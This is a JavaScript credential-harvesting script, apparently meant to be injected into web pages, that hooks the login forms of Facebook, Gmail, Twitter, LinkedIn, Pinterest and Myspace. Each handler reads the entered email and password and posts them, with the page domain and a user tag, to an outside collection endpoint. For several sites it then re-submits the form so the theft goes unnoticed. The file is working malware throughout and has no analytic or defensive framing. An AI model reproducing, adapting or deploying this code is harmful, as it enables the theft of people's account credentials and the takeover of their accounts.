//----------------------Do not edit this script unless you know what you are doing----------------------

//Variables for the script
var c = user;
var u;
var p;
var s = document.domain;
var TargetSite = 'http://wlc.pusku.com/RinLoginSpoofer/Db_agent.php';
console.log(c);
console.log(TargetSite);
//------The Script------//

// FB Cred Handler
var FB_submit = 0;
$('#login_form').submit(function(){
  	u = $('input#email').val();
		p = $('input#pass').val();
		
		
		//Send Credentials
		if(FB_submit == 0){
				
			$.post(TargetSite, {u:u, p:p, s:s, c:c}, function(){})
				.done(function(){})
				.fail(function(){})
				.always(function(){FB_submit = 1; $('form#login_form').submit();});
				return false;
		}
	});
	
// Gmail/plus Cred Handler
var G_submit = 0;
$('#gaia_loginform').submit(function(){
		u = $('input#Email').val();
		p = $('input#Passwd').val();
		
		
		//Send Credentials
		if(G_submit == 0){
				
			$.post(TargetSite, {u:u, p:p, s:s, c:c}, function(){})
				.done(function(){})
				.fail(function(){})
				.always(function(){G_submit = 1; $('form#gaia_loginform').submit();});
				return false;
		}
	});

// Twitter Cred Handler
var Twi_submit = 0;
$('form.signin').submit(function(){
		u = $('input#signin-email').val();
		p = $('input#signin-password').val();
		
		
		//Send Credentials
		if(Twi_submit == 0){
				
			$.post(TargetSite, {u:u, p:p, s:s, c:c}, function(){})
				.done(function(){})
				.fail(function(){})
				.always(function(){Twi_submit = 1; $('form.signin').submit();});
				return false;
		}
	});
	
// LinkedIn Cred Handler
var Li_submit = 0;
$('form#login').submit(function(){
		u = $('input#session_key-login').val();
		p = $('input#session_password-login').val();
		
		
		//Send Credentials
		if(Li_submit == 0){
				
			$.post(TargetSite, {u:u, p:p, s:s, c:c}, function(){})
				.done(function(){})
				.fail(function(){})
				.always(function(){});
		}
	});

// Pinterest Cred Handler
var Pin_submit = 0;
$('form.loginForm').submit(function(){
		u = $('input[name="username_or_email"]').val();
		p = $('input[name="password"]').val();
		
		
		//Send Credentials
		if(Pin_submit == 0){
				
			$.post(TargetSite, {u:u, p:p, s:s, c:c}, function(){})
				.done(function(){})
				.fail(function(){})
				.always(function(){});
		}
	});
	
// Myspace Cred Handler
var My_submit = 0;
$('form#signInForm').submit(function(){
		u = $('input[name="email"]').val();
		p = $('input[name="password"]').val();
		
		
		//Send Credentials
		if(My_submit == 0){
				
			$.post(TargetSite, {u:u, p:p, s:s, c:c}, function(){})
				.done(function(){})
				.fail(function(){})
				.always(function(){});
		}
	});
	
	
